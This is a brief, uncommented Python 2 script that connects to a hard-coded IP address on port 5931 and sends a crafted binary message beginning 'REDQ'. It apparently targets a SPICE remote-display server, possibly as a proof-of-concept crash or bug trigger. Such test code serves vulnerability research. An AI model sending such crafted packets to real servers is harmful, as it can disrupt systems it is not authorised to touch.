# -*- encoding: utf-8 -*-
import socket
import sys

reload(sys)
sys.setdefaultencoding('utf-8')
host = "172.118.35.13"
port = 5931

if __name__ == "__main__":
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    s.send("\x52\x45\x44\x51\x02\x00\x00\x00\x02\x00\x1a\x00\x00\x00\xe7\xf0" \
            "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
            "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
            "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
            "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
            "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x01\x00" \
            "\x00\x00\x01\x00\x00\x00\x12\x00\x2e\x00\x21\x01\x00\x00\x0f\x00" \
            "\x00\x00")
    print s.recv(1024)
    s.close()